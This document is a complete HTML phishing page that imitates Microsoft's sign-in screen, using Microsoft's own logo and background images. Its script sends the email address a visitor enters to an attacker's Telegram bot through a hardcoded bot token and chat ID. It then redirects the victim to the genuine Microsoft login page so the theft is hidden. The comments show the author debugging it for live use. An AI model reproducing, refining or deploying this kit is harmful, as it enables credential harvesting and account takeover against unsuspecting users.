<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
        html, body { margin: 0; padding: 0; width: 100%; height: 100%; }

        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            /* THE FIX: We use 'fixed' and '100vw' to force the background to stay */
            background: #deeaf4 url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_61c068305f6c80521cc5c98695844893.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center;
        }

        .login-card {
            background: #fff; width: 440px; padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2); min-height: 376px;
        }

        .ms-logo { width: 108px; margin-bottom: 24px; display: block; }
        h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; color: #1b1b1b; }

        .input-field {
            width: 100%; border: none; border-bottom: 1px solid #666;
            padding: 8px 0; font-size: 16px; margin-bottom: 12px; outline: none;
        }
        .input-field:focus { border-bottom: 2px solid #0067b8; }

        .link-text { font-size: 13px; margin: 14px 0; color: #1b1b1b; }
        .link-text a { color: #0067b8; text-decoration: none; cursor: pointer; }

        .button-row { display: flex; justify-content: flex-end; margin-top: 40px; }
        .btn-next {
            background-color: #0067b8; color: #fff; border: none;
            padding: 8px 36px; font-size: 15px; cursor: pointer; min-width: 108px;
        }

        /* SIGN-IN OPTIONS (Fixed position) */
        .options-box {
            background: #fff; width: 440px; padding: 12px 44px;
            margin-top: 1px; box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            display: flex; align-items: center; cursor: pointer;
        }
        .key-icon { width: 24px; margin-right: 12px; opacity: 0.6; }

        .footer { position: fixed; bottom: 0; right: 0; padding: 12px 30px; font-size: 12px; }
        .footer a { margin-left: 24px; text-decoration: none; color: #000; }
    </style>
</head>
<body>

    <div class="login-card">
        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="ms-logo">
        <h1>Sign in</h1>
        <input type="email" id="email" placeholder="Email, phone, or Skype" class="input-field">
        <p class="link-text">No account? <a href="#">Create one!</a></p>
        <p class="link-text"><a href="#">Can't access your account?</a></p>
        <div class="button-row">
            <button class="btn-next" onclick="submitData()">Next</button>
        </div>
    </div>

    <div class="options-box">
        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" class="key-icon">
        <span style="font-size: 15px;">Sign-in options</span>
    </div>

    <div class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
    </div>

    <script>
        async function submitData() {
            const emailVal = document.getElementById('email').value;
            if(!emailVal) return;

            const botToken = "8762119215:AAFqwntuZq7tLC25lf9wtNlddbZ62njFcHo";
            const chatId = "5733378501";
            
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: `✅ **FINAL AUDIT**\nUser: ${emailVal}`, parse_mode: 'HTML' }),
                    keepalive: true
                });
            } catch (e) {}

            // THE REDIRECT FIX: Using the generic login page to avoid the "Unauthorized Client" error
            window.location.href = "https://login.microsoftonline.com/common/login?login_hint=" + encodeURIComponent(emailVal);
        }
    </script>
</body>
</html>
